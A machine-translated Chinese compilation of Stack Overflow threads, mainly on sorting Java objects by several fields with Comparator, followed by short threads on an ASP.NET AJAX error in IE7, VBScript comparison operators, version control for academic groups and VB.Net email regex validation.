为这样的用例手动编写`Comparator`是一个糟糕的解决方案 IMO。这种临时方法有很多缺点：

*   没有代码重用。违反 DRY。
*   样板。
*   增加出错的可能性。

* * *

**那么解决方案是什么？**

首先是一些理论。

让我们用 来表示命题“类型`A`支持比较” `Ord A`。（从程序的角度来看，您可以将其`Ord A`视为包含用于比较两个 s 的逻辑的对象`A`。是的，就像`Comparator`.）

现在，如果`Ord A`和`Ord B`，那么它们的复合`(A, B)`也应该支持比较。即`Ord (A, B)`。如果`Ord A`,`Ord B`和`Ord C`, 那么`Ord (A, B, C)`.

我们可以将此论点扩展到任意数量，并说：

`Ord A, Ord B, Ord C, ..., Ord Z`⇒`Ord (A, B, C, .., Z)`

让我们将此语句称为 1。

复合材料的比较将按照您在问题中的描述进行：首先尝试第一个比较，然后是下一个，然后是下一个，依此类推。

这是我们解决方案的第一部分。现在是第二部分。

如果您知道`Ord A`，并且知道如何转换`B`为`A`（称为转换函数`f`），那么您也可以拥有`Ord B`. 如何？好吧，当`B`要比较两个实例时，您首先将它们转换为`A`using`f`然后 apply `Ord A`。

在这里，我们将转换映射`B → A`到`Ord A → Ord B`. 这称为逆变映射（或`comap`简称）。

`Ord A, (B → A)`⇒<sub>commap`Ord B`

让我们将此语句称为 2。

* * *

现在让我们将其应用于您的示例。

您有一个名为的数据类型`Person`，它包含三个 type 字段`String`。

*   我们知道`Ord String`。根据声明 1 `Ord (String, String, String)`，.

*   我们可以很容易地写一个函数 from `Person`to `(String, String, String)`。（只需返回三个字段。）由于我们知道`Ord (String, String, String)`and `Person → (String, String, String)`，通过语句 2，我们可以使用`comap`to get `Ord Person`。

QED。

* * *

**我如何实现所有这些概念？**

好消息是你不必这样做。已经存在[一个库](http://functionaljava.org/)，它实现了这篇文章中描述的所有想法。（如果你好奇这些是如何实现的，你可以[看看幕后](https://github.com/functionaljava/functionaljava)。）

这就是代码的外观：

```
Ord<Person> personOrd = 
 p3Ord(stringOrd, stringOrd, stringOrd).comap(
   new F<Person, P3<String, String, String>>() {
     public P3<String, String, String> f(Person x) {
       return p(x.getFirstName(), x.getLastname(), x.getAge());
     }
   }
 ); 
```

**解释：**

*   [`stringOrd`](http://functionaljava.googlecode.com/svn/artifacts/3.0/javadoc/fj/Ord.html#stringOrd)是一个类型的对象`Ord<String>`。这对应于我们最初的“支持比较”命题。
*   [`p3Ord`](http://functionaljava.googlecode.com/svn/artifacts/3.0/javadoc/fj/Ord.html#p3Ord%28fj.Ord,%20fj.Ord,%20fj.Ord%29)是一个接受`Ord<A>`, `Ord<B>`, `Ord<C>`, 并返回的方法`Ord<P3<A, B, C>>`。这对应于陈述 1。（[`P3`](http://functionaljava.googlecode.com/svn/artifacts/3.0/javadoc/fj/P3.html)代表具有三个元素的产品。产品是复合材料的代数项。）
*   [`comap`](http://functionaljava.googlecode.com/svn/artifacts/3.0/javadoc/fj/Ord.html#comap%28fj.F%29)对应好，`comap`.
*   [`F<A, B>`](http://functionaljava.googlecode.com/svn/artifacts/3.0/javadoc/fj/F.html)表示一个变换函数`A → B`。
*   [`p`](http://functionaljava.googlecode.com/svn/artifacts/3.0/javadoc/fj/P.html#p%28A,%20B,%20C%29)是创建产品的工厂方法。
*   整个表达式对应于语句 2。

希望有帮助。

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2008-12-15T20:01:31.387

除了比较方法，您可能只想在 Person 类中定义几种类型的“比较器”子类。这样你就可以将它们传递给标准的 Collections 排序方法。

* * *

## 回答 #12

> 赞同：5
> 
> 时间：2018-05-05T22:14:40.580

```
//Following is the example in jdk 1.8
package com;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

class User {
    private String firstName;
    private String lastName;
    private Integer age;

    public Integer getAge() {
        return age;
    }

    public User setAge(Integer age) {
        this.age = age;
        return this;
    }

    public String getFirstName() {
        return firstName;
    }

    public User setFirstName(String firstName) {
        this.firstName = firstName;
        return this;
    }

    public String getLastName() {
        return lastName;
    }

    public User setLastName(String lastName) {
        this.lastName = lastName;
        return this;
    }

}

public class MultiFieldsComparision {

    public static void main(String[] args) {
        List<User> users = new ArrayList<User>();

        User u1 = new User().setFirstName("Pawan").setLastName("Singh").setAge(38);
        User u2 = new User().setFirstName("Pawan").setLastName("Payal").setAge(37);
        User u3 = new User().setFirstName("Anuj").setLastName("Kumar").setAge(60);
        User u4 = new User().setFirstName("Anuj").setLastName("Kumar").setAge(43);
        User u5 = new User().setFirstName("Pawan").setLastName("Chamoli").setAge(44);
        User u6 = new User().setFirstName("Pawan").setLastName("Singh").setAge(5);

        users.add(u1);
        users.add(u2);
        users.add(u3);
        users.add(u4);
        users.add(u5);
        users.add(u6);

        System.out.println("****** Before Sorting ******");

        users.forEach(user -> {
            System.out.println(user.getFirstName() + " , " + user.getLastName() + " , " + user.getAge());
        });

        System.out.println("****** Aftre Sorting ******");

        users.sort(
                Comparator.comparing(User::getFirstName).thenComparing(User::getLastName).thenComparing(User::getAge));

        users.forEach(user -> {
            System.out.println(user.getFirstName() + " , " + user.getLastName() + " , " + user.getAge());
        });

    }

} 
```

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2008-12-15T20:00:21.480

我认为如果您的比较算法“聪明”会更令人困惑。我会采用您建议的众多比较方法。

对我来说唯一的例外是平等。对于单元测试，覆盖 .Equals（在 .net 中）以确定两个对象之间的多个字段是否相等（而不是引用相等）对我很有用。

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2008-12-15T20:03:22.537

如果用户可以通过多种方式订购人员，您还可以在某处将多个[Comparator](http://java.sun.com/javase/6/docs/api/java/util/Comparator.html)设置为常量。大多数排序操作和排序集合都将比较器作为参数。

* * *

## 回答 #15

> 赞同：3
> 
> 时间：2020-01-03T08:12:31.900

如果我们必须基于多个字段对 Person 对象进行排序，则此处的代码实现相同。

```
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;

public class Person {

private String firstName;
private String lastName;
private int age;

public String getFirstName() {
    return firstName;
}

public void setFirstName(String firstName) {
    this.firstName = firstName;
}

public String getLastName() {
    return lastName;
}

public void setLastName(String lastName) {
    this.lastName = lastName;
}

public int getAge() {
    return age;
}

public void setAge(int age) {
    this.age = age;
}

public Person(String firstName, String lastName, int age) {
    this.firstName = firstName;
    this.lastName = lastName;
    this.age = age;
}

static class PersonSortingComparator implements Comparator<Person> {

    @Override
    public int compare(Person person1, Person person2) {

        // for first name comparison
        int firstNameCompare = person1.getFirstName().compareTo(person2.getFirstName());

        // for last name comparison
        int lastNameCompare = person1.getLastName().compareTo(person2.getLastName());

        // for last name comparison
        int ageCompare = person1.getAge() - person2.getAge();

        // Now comparing
        if (firstNameCompare == 0) {
            if (lastNameCompare == 0) {
                return ageCompare;
            }
            return lastNameCompare;
        }
        return firstNameCompare;
    }
}

public static void main(String[] args) {
    Person person1 = new Person("Ajay", "Kumar", 27);
    Person person2 = new Person("Ajay","Gupta", 23);
    Person person3 = new Person("Ajay","Kumar", 22);

    ArrayList<Person> persons = new ArrayList<>();
    persons.add(person1);
    persons.add(person2);
    persons.add(person3);

    System.out.println("Before Sorting:\n");
    for (Person person : persons) {
        System.out.println(person.firstName + " " + person.lastName + " " + person.age);
    }

    Collections.sort(persons, new PersonSortingComparator());

    System.out.println("After Sorting:\n");
    for (Person person : persons) {
        System.out.println(person.firstName + " " + person.lastName + " " + person.age);
    }
}

} 
```

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2014-06-24T12:09:38.470

```
//here threshold,buyRange,targetPercentage are three keys on that i have sorted my arraylist 
final Comparator<BasicDBObject> 

    sortOrder = new Comparator<BasicDBObject>() {
                    public int compare(BasicDBObject e1, BasicDBObject e2) {
                        int threshold = new Double(e1.getDouble("threshold"))
                        .compareTo(new Double(e2.getDouble("threshold")));
                        if (threshold != 0)
                            return threshold;

                        int buyRange = new Double(e1.getDouble("buyRange"))
                        .compareTo(new Double(e2.getDouble("buyRange")));
                        if (buyRange != 0)
                            return buyRange;

                        return (new Double(e1.getDouble("targetPercentage")) < new Double(
                                e2.getDouble("targetPercentage")) ? -1 : (new Double(
                                        e1.getDouble("targetPercentage")) == new Double(
                                                e2.getDouble("targetPercentage")) ? 0 : 1));
                    }
                };
                Collections.sort(objectList, sortOrder); 
```

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2020-12-19T11:14:54.633

迟到总比没有好 - 如果您正在寻找不必要的混乱或开销，那么在最少代码/快速执行方面很难同时击败以下内容。

**数据类：**

```
public class MyData {
    int id;
    boolean relevant;
    String name;
    float value;
} 
```

**比较器：**

```
public class MultiFieldComparator implements Comparator<MyData> {
    @Override
    public int compare(MyData dataA, MyData dataB) {
        int result;
        if((result = Integer.compare(dataA.id, dataB.id)) == 0 &&
           (result = Boolean.compare(dataA.relevant, dataB.relevant)) == 0 &&
           (result = dataA.name.compareTo(dataB.name)) == 0)
            result = Float.compare(dataA.value, dataB.value);
        return result;
    }
} 
```

如果您只是想按自定义顺序对集合进行排序，那么以下内容更加简洁：

```
myDataList.sort((dataA, dataB) -> {
    int result;
    if((result = Integer.compare(dataA.id, dataB.id)) == 0 &&
       (result = Boolean.compare(dataA.relevant, dataB.relevant)) == 0 &&
       (result = dataA.name.compareTo(dataB.name)) == 0)
        result = Float.compare(dataA.value, dataB.value);
    return result;
}); 
```

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2022-01-12T18:24:11.610

Java 8 通过 lambda 方式我们可以通过方法引用进行比较。学生 POJO

```
public class Student {
int id;
String firstName;
String lastName;
String subject;

public Student(int id, String firstName, String lastName, String subject) {
    this.id = id;
    this.firstName = firstName;
    this.lastName = lastName;
    this.subject = subject;
}
enter code here 
```

现在我们可以根据

`1\. id->FirstName->LastName->Subject 2\. Subject->id->FirstName->LastName`

我们将在数组 Stream 中使用 Comparator

```
public class TestComprator {
public static void main(String[] args) {
    Student s1= new Student(108, "James", "Testo", "Physics");
    Student s2= new Student(101, "Fundu", "Barito", "Chem");
    Student s3= new Student(105, "Sindhu", "Sharan", "Math");
    Student s4= new Student(98, "Rechel", "Stephen", "Physics");
    System.out.printf("----------id->FirstName->LastName->Subject-------------");
    Arrays.asList(s1,s2,s3,s4).stream()
            .sorted(Comparator.comparing(Student::getId)
                    .thenComparing(Student::getFirstName)
                .thenComparing(Student::getLastName)
                .thenComparing(Student::getSubject))
            .forEach(System.out::println);

    System.out.printf("----Subject->id->FirstName->LastName ------\n");
    Arrays.asList(s1,s2,s3,s4).stream()
            .sorted(Comparator. comparing(Student::getSubject)
                    .thenComparing(Student::getId)
                    .thenComparing(Student::getFirstName)
                    .thenComparing(Student::getLastName)
                   )
            .forEach(System.out::println);
} 
```

}

输出：-

```
`----------id->FirstName->LastName->Subject-------------
Student{id=98, firstName='Rechel', lastName='Stephen', subject='Physics'}
Student{id=101, firstName='Fundu', lastName='Barito', subject='Chem'}
Student{id=105, firstName='Sindhu', lastName='Sharan', subject='Math'}
Student{id=108, firstName='James', lastName='Testo', subject='Physics'}
 ----Subject->id->FirstName->LastName ------
Student{id=101, firstName='Fundu', lastName='Barito', subject='Chem'}
Student{id=105, firstName='Sindhu', lastName='Sharan', subject='Math'}
Student{id=98, firstName='Rechel', lastName='Stephen', subject='Physics'}
Student{id=108, firstName='James', lastName='Testo', subject='Physics'} 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2008-12-15T21:33:20.217

如果您实现[Comparable](http://java.sun.com/j2se/1.4.2/docs/api/java/lang/Comparable.html)接口，您将需要选择一个简单的属性进行排序。这称为自然排序。将其视为默认值。当没有提供特定的比较器时，总是使用它。通常这是名称，但您的用例可能需要不同的名称。您可以自由使用可以提供给各种集合 API 的任意数量的其他比较器来覆盖自然排序。

另请注意，通常如果 a.compareTo(b) == 0，则 a.equals(b) == true。如果没有也没关系，但有副作用需要注意。在 Comparable 接口上查看优秀的 javadocs，您会发现很多关于此的重要信息。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2015-12-09T13:16:51.937

以下博客给出了良好的链式比较器示例

[http://www.codejava.net/java-core/collections/sorting-a-list-by-multiple-attributes-example](http://www.codejava.net/java-core/collections/sorting-a-list-by-multiple-attributes-example)

```
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

/**
 * This is a chained comparator that is used to sort a list by multiple
 * attributes by chaining a sequence of comparators of individual fields
 * together.
 *
 */
public class EmployeeChainedComparator implements Comparator<Employee> {

    private List<Comparator<Employee>> listComparators;

    @SafeVarargs
    public EmployeeChainedComparator(Comparator<Employee>... comparators) {
        this.listComparators = Arrays.asList(comparators);
    }

    @Override
    public int compare(Employee emp1, Employee emp2) {
        for (Comparator<Employee> comparator : listComparators) {
            int result = comparator.compare(emp1, emp2);
            if (result != 0) {
                return result;
            }
        }
        return 0;
    }
} 
```

调用比较器：

```
Collections.sort(listEmployees, new EmployeeChainedComparator(
                new EmployeeJobTitleComparator(),
                new EmployeeAgeComparator(),
                new EmployeeSalaryComparator())
        ); 
```

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2017-03-21T19:37:53.943

从[史蒂夫的回答](https://stackoverflow.com/a/369867/1744774)开始，可以使用三元运算符：

```
public int compareTo(Person other) {
    int f = firstName.compareTo(other.firstName);
    int l = lastName.compareTo(other.lastName);
    return f != 0 ? f : l != 0 ? l : Integer.compare(age, other.age);
} 
```

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2017-11-22T13:02:50.887

用java中的hashcode方法比较两个对象很容易`

```
public class Sample{

  String a=null;
  String b=null;

  public Sample(){
      a="s";
      b="a";
  }
  public Sample(String a,String b){
      this.a=a;
      this.b=b;
  }
  public static void main(String args[]){
      Sample f=new Sample("b","12");
      Sample s=new Sample("b","12");
      //will return true
      System.out.println((s.a.hashCode()+s.b.hashCode())==(f.a.hashCode()+f.b.hashCode()));

      //will return false
      Sample f=new Sample("b","12");
      Sample s=new Sample("b","13");
      System.out.println((s.a.hashCode()+s.b.hashCode())==(f.a.hashCode()+f.b.hashCode()));

} 
```

* * *

## 回答 #23

> 赞同：-2
> 
> 时间：2012-03-23T16:12:06.413

[使用Google 的 Guava 库](http://code.google.com/p/guava-libraries/wiki/CommonObjectUtilitiesExplained#equals)很容易做到。

例如`Objects.equal(name, name2) && Objects.equal(age, age2) && ...`

更多示例：

*   [https://stackoverflow.com/a/5039178/1180621](https://stackoverflow.com/a/5039178/1180621)

# asp.net - Sys 未定义 - 仅 IE 7 中的 ajax 问题

> ID：369515
> 
> 赞同：2
> 
> 时间：2008-12-15T19:59:26.723
> 
> 标签：asp.net, ajax, internet-explorer-7, iis-6, windows-server-2003

我有一个奇怪的问题，似乎只影响 IE 7。该网站是一个 3.5 c# asp.net 网站，它利用 ajax 和部署到 win 2003 服务器的 ajax 控制工具包。web.config 中的一切似乎都是正确的。事实上，一切都在 IE6 和 Firefox 3 中完美运行。只有在 IE7 中，我才得到可怕的 sys is undefined 错误。

此外，在相同代码的不同安装中，该站点似乎在 IE7 上运行良好。该服务器正在运行具有非常相似的设置的 win 2003。

由于这似乎是服务器问题，是否有任何设置会阻止启用 ajax 的站点在 IE7 中正确显示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T23:51:42.683

我知道你说过 web.config 中的一切似乎都是正确的，但仍然在该服务器上再次检查它：

```
<add verb="GET,HEAD"
   path="ScriptResource.axd"
   type="System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
   validate="false"/> 
```

在`<httpHandlers>`元素中。

如果它在那里，那么在 IE7 中执行查看源代码，并获取 ScriptResource.axd 脚本引用 URL 之一，然后将其粘贴到浏览器中，看看它会返回什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-16T13:37:15.530

信不信由你，但清空临时 Internet 文件解决了这个问题。我讨厌这样的事情！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-01T00:57:08.747

当我们迁移到 AJAX 控件工具包的新版本时，我遇到了这个错误，并且当我重建时，该库的新 dll 没有正确传播出去。所以清除临时文件也是我必须做的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-17T05:02:16.973

您是否在使用 AJAX 工具包脚本管理器的“组合脚本”功能？众所周知，它会导致某些浏览器/代理出现问题，从而导致您所描述的错误。我认为它在 3.5 中默认启用，因此您可能需要查看将其关闭并查看您的问题是否仍然存在。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T23:44:53.057

你确定它只是IE7？也许其他浏览器正在抑制错误。Firefox 上的 Firebug 可能会将这一点暴露出来。

两次我见过这样的事情是 a) 在与 ASP.NET Ajax 相同的项目中使用 jQuery，这里 jQuery 的 noConflict 方法提供了帮助

b) 检查页面上 ScriptManager 的位置，确保它没有包含在内容页面中，而是在上面的母版页或类似内容中引用

希望这可以帮助

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-08-04T22:09:34.183

没有一个建议对我有用，但是当在下面添加以下内容时`<system.web>`，它起作用了！

```
<httpHandlers>
   <remove verb="*" path="*.asmx"/>
   <add verb="*" path="*.asmx" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"/>
   <add verb="*" path="*_AppService.axd" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"/>
   <add verb="GET,HEAD" path="ScriptResource.axd" type="System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" validate="false"/>
  </httpHandlers>

  <httpModules>
   <add name="ScriptModule" type="System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"/>
  </httpModules> 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2011-02-15T21:33:57.227

尝试将您的 javascript 代码放在下面`<asp:ToolkitScriptManager>`

# vbscript - 比较值时使用 NOT 或 <> 更好吗？

> ID：369519
> 
> 赞同：31
> 
> 时间：2008-12-15T20:00:35.770
> 
> 标签：vbscript

在 VBScript 中比较值时使用 NOT 或使用 <> 更好吗？
这是：

```
 If NOT value1 = value2 Then 
```

或这个：

```
 If value1 <> value2 Then 
```

更好的？

编辑：这是我的反驳。
在寻找逻辑否定布尔值时，您将使用 NOT 运算符，所以这是正确的：

```
 If NOT boolValue1 Then 
```

并且在第一个示例的情况下进行比较时，将返回一个布尔值。这些值要么等于 True，要么不等于 False。因此使用 NOT 运算符是合适的，因为您在逻辑上否定布尔值。

为了便于阅读，将比较放在括号中可能会有所帮助。

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2008-12-15T20:03:17.170

后者 ( `<>`)，因为前者的含义并不清楚，除非您完全理解适用于`Not`and`=`运算符的运算顺序：这是一个很容易被忽略的微妙之处。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-02-01T12:09:18.390

因为“not ... =”是两个操作，而“<>”只有一个，所以使用“<>”会更快。

这是一个快速的实验来证明它：

```
StartTime = Timer
For x = 1 to 100000000
   If 4 <> 3 Then
   End if
Next
WScript.echo Timer-StartTime

StartTime = Timer
For x = 1 to 100000000
   If Not (4 = 3) Then
   End if
Next
WScript.echo Timer-StartTime 
```

我在我的机器上得到的结果：

```
4.783203
5.552734 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T20:09:37.280

同意，代码可读性对其他人非常重要，但更重要的是您自己。想象一下，与第二个例子相比，理解第一个例子是多么困难。

如果代码需要超过几秒钟的时间来阅读（理解），也许有更好的方法来编写它。在这种情况下，第二种方式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T20:26:26.967

第二个示例将是一个可以使用的示例，不仅是为了可读性，还因为在第一个示例中，如果不是 value1 将返回一个布尔值以与 value2 进行比较。IOW，您需要将该示例重写为

```
If NOT (value1 = value2) 
```

这只是使 NOT 关键字的使用毫无意义。

# .net - 如何使用“网络服务”帐户启动控制台应用程序？

> ID：369527
> 
> 赞同：4
> 
> 时间：2008-12-15T20:03:50.740
> 
> 标签：.net, windows, authentication, kerberos, delegation

我有一个控制台应用程序，我想以“NT AUTHORITY\NetworkService”的身份运行，但我不记得该怎么做 - 唯一的原因是我将在 Windows 服务中托管我的服务，但用于 Kerberos 身份验证测试我想使用域中已经存在的（服务主体名称）SPN（它确实启用了委派）。

简而言之，我可以简单地将它从控制台应用程序转换为 Windows 服务，但我希望避免这样做。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T20:58:17.917

我不知道它有多准确，但*建议*这可能是不可能的 - 请参阅[此处](http://www.derkeiler.com/Newsgroups/microsoft.public.windows.server.security/2005-07/0331.html)。

将它移植到服务中可能是最简单的......出于调试目的，编写可以作为服务或控制台 exe 工作的代码相当容易（使其易于调试，尽管身份错误）。我一直这样做...

[这是](http://groups.google.co.uk/group/microsoft.public.dotnet.languages.csharp/browse_thread/thread/4d45e9ea5471cba4/4519371a77ed4a74)一个例子；在代码中搜索开关：

```
case "-c": 
case "-console": 
```

即使用“-c”，它直接运行代码，而不是启动服务基础设施。该代码还显示了如何让 exe 充当自安装程序，这非常方便。

# iis - IIS 书籍推荐

> ID：369531
> 
> 赞同：2
> 
> 时间：2008-12-15T20:05:13.453
> 
> 标签：iis, admin

我是一名开发人员，将我们的 IIS 服务器的管理职责交给了他。在设置网站、虚拟目录等方面，我对 IIS 相当熟悉，但我想如果我要完全成为服务器的管理员，我最好加快速度。

对 IIS 书籍有什么建议，尤其是对于来自编程背景而不是 Windows 管理员背景的人？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T21:00:09.287

检查此服务器 2008 [http://www.wrox.com/WileyCDA/WroxTitle/Professional-IIS-7.productCd-0470097825.html](http://www.wrox.com/WileyCDA/WroxTitle/Professional-IIS-7.productCd-0470097825.html)

# version-control - 学术研究小组的源代码控制？

> ID：369538
> 
> 赞同：3
> 
> 时间：2008-12-15T20:07:04.510
> 
> 标签：version-control

与大多数软件开发组织相比，我们大学系内的小型研究小组由一名教授和一群研究生和本科生组成，很难保留研究本身之外的任何工作知识。我们的背景各不相同，很少涉及计算机科学背景。（我自己从未上过与计算机相关的课程。）

然而，我们需要对我们的自制软件进行规划和分析，区分当前最佳的生产版本和开发版本，防止构思不当的更改，能够回忆去年的版本等。很难获得每一个学生加快颠覆并学会小心存储库，了解分支/标签或我们如何组织它。（第二个问题：如何让某人在 svn 上加快速度？）

也许其中一个分布式版本控制系统更适合，或者 svn 以外的集中式系统是明智的，或者如果不是，我们应该遵循容易传播的颠覆实践吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T21:00:29.957

我想说的是，Subversion 应该在您所描述的学术环境中为您提供有用性和易用性之间的正确平衡。我一直在考虑类似的问题（我是物理专业的毕业生；[实际上我之前曾发布过类似的东西](https://stackoverflow.com/questions/38239/practices-for-programming-in-a-scientific-environment)），我目前的建议是：

*   建立一个集中的版本控制系统，最好是 SVN。随着毕业生和本科生不断出现和消失，我想说分布式版本控制很可能会导致人们正在“本地”进行的修订*与他们一起*消失。集中式版本控制将为您提供“一个真正的修订版”。

*   让每个人都尝试一个小型测试存储库，这样他们就可以掌握它的窍门。如果你搜索 SO，你会发现很多关于优秀教程的问题和答案。

*   也许考虑租用一个托管的 SVN 存储库，它可能会为您省去在本地网络上设置自己的麻烦。（我认识的一些大学对网络安全有非常严格的规定，所以拥有自己的服务器有时是一个漫长而复杂的官僚程序。）

*   告诉您的学生：代码在签入之前不存在！而且我猜他们很快就会发现 VC 的优势，一旦他们必须进行第一次“还原”/“回滚”:)

*   至于让学生快速掌握 Svn：请参阅[关于版本控制的软件木工课程](http://www.swc.scipy.org/lec/version.html)和 Subversion 书中的“入门”一章。您可能还希望有一个更有经验的人与一个新学生坐一次或两次（似乎是浪费时间，但回报是双倍的！）。

但请注意，我对此没有太多实际经验。因此，如果您可以稍后回帖告诉我们您的经历，我将非常高兴！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T20:10:58.840

我不确定“让每个人都熟悉 SVN”是否困难。如果他们理解版本控制的概念，这是最简单的实现之一。

它当然有很多用途，但是您提到的其他方法也可以使用，尽管最初可能更难购买。（便于使用）

我认为您会发现更难的是定义在使用源存储库时应该使用的策略。一旦你定义了它，你就可以实现版本控制系统。（IE开发者有自己的分支，测试后提升为mainline/trunk，或者全部进入trunk等）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T20:12:26.217

即使你从不使用分支和合并，svn 也是有价值的。如果您在 Windows 上，VisualSVN 服务器应用程序易于设置并易于使用安全性。试试看。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T20:37:55.447

Subversion 和 TortoiseSVN 使得使用 Subversion 并不比使用 Windows Explorer 本身更难。其他操作系统有多种接口，使 subversion 非常易于使用。

# vb.net - 使用正则表达式 VB.Net 验证电子邮件

> ID：369543
> 
> 赞同：12
> 
> 时间：2008-12-15T20:07:55.320
> 
> 标签：vb.net, regex, email

我正在 VB.Net 中处理一个小项目，我从文本框中获取输入，并且需要验证这是一个电子邮件地址。

我发现这个表达式 "^[_a-z0-9-]+(.[_a-z0-9-]+) *@[a-z0-9-]+(.[a-z0-9-]+)* ( .[az]{2,4})$"，但我找不到任何方法来测试它是否通过。

我想要一些代码，例如：

```
if not txtEmail.text = regexString then
    something happens..
else
    something else happens..
end if 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-12-15T20:10:55.047

使用`System.Text.RegularExpressions.Regex`类：

```
Function IsEmail(Byval email as string) as boolean
    Static emailExpression As New Regex("^[_a-z0-9-]+(.[a-z0-9-]+)@[a-z0-9-]+(.[a-z0-9-]+)*(.[a-z]{2,4})$")

    return emailExpression.IsMatch(email)
End Function 
```

关于这个答案，最重要的一点是我自己没有编写正则表达式。有很多错误的方法似乎是正确的，并且您可以将其带到多个细节级别。例如，您是否希望将其限制为有效的顶级域，如果是，您如何解释他们现在偶尔添加新 TLD 的事实？如果正则表达式是那个测试最合适的地方，还是应该有单独的代码来做那个检查？自从最初撰写以来，即使此答案中的表达现在也非常陈旧。

我建议为您知道会随着时间的推移而维护的表达式找到一个外部资源。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-17T15:00:49.150

[从我关于将电子邮件地址与 regex 匹配的文章中](http://www.regular-expressions.info/email.html)选择您最喜欢的 regex ，并将其插入到此 Visual Basic 代码中：

```
If Regex.IsMatch(SubjectString, "regex") Then
    Error = False
Else
    Error = True
End If 
```

匹配电子邮件地址的最佳正则表达式是一个有争议的话题，我不想在这里讨论。我的文章讨论了选择正则表达式时应该注意的问题。Joel Coehoorn 的答案中的正则表达式绝对不是一个好的。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-15T20:28:10.630

这种事情有一个很棒的网站，[http://regexlib.com/](http://regexlib.com/)。它不仅有一个测试器应用程序，您可以在其中粘贴正则表达式并对其进行测试，而且还有一个正则表达式库，您可以将其用于社区对其有效性的反馈等。我不是正则表达式专家，所以当我需要一个快速的正则表达式时，我会去这里。

此外，如果您正在考虑自己开发正则表达式，有一个名为[Regex Buddy](http://www.regexbuddy.com/)的出色工具，可让您使用易于理解的正则表达式英文解释即时创建和测试您的正则表达式。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-06T19:47:32.770

可能偏离主题，因为它不是正则表达式解决方案，但您可以只使用 .NET 2.0 的一些内置功能：

```
try
{
   MailAddress email = new MailAddress(txtEmail.Text);
}
catch(FormatException fe)
{
   // output error
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-15T20:33:07.327

那个正则表达式并不完整......事实上......大多数都不是（查看[这篇文章](http://haacked.com/archive/2007/08/21/i-knew-how-to-validate-an-email-address-until-i.aspx)或[这篇](http://regexadvice.com/blogs/mash/archive/2008/09/28/Validating-Email-Revisited-.aspx)文章）。

除非您真的很享受痛苦，否则正则表达式不是验证电子邮件地址的正确方法。

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2008-12-15T20:39:47.423

电子邮件地址：RFC 2822（简体）匹配普通电子邮件地址。不检查顶级域。需要打开“不区分大小写”选项。

```
Dim FoundMatch As Boolean
Try
    FoundMatch = Regex.IsMatch(txtEmail.text, "\A(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\Z", RegexOptions.IgnoreCase)
Catch ex As ArgumentException
    'Syntax error in the regular expression
End Try

If Not FoundMatch Then
   Error = True
Else
   Error = False
End If 
```

# expression-blend - 学习 Expressions Blend 2 的最佳方法是什么？

> ID：369551
> 
> 赞同：0
> 
> 时间：2008-12-15T20:09:39.433
> 
> 标签：expression-blend, expression-blend-2

快速上手 Microsoft Expressions Blend 2 的最佳方法是什么？

有没有一些好的网站可以让我开始，或者有人有一本他们会推荐的好书？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T20:13:19.287

Expression Blend 用于创建 Sliverlight XAML。我将从[sliverlight.net开始](http://silverlight.net)

这是你应该开始的地方。

[http://silverlight.net/GetStarted/](http://silverlight.net/GetStarted/)

这是 Scott G[关于 Blend 和 Sliverlight 的博客。](http://weblogs.asp.net/scottgu/archive/2008/02/28/first-look-at-using-expression-blend-with-silverlight-2.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-31T19:20:49.567

有一本不错的书： Victor Gaudioso 的**Foundation Expression Blend 2**。

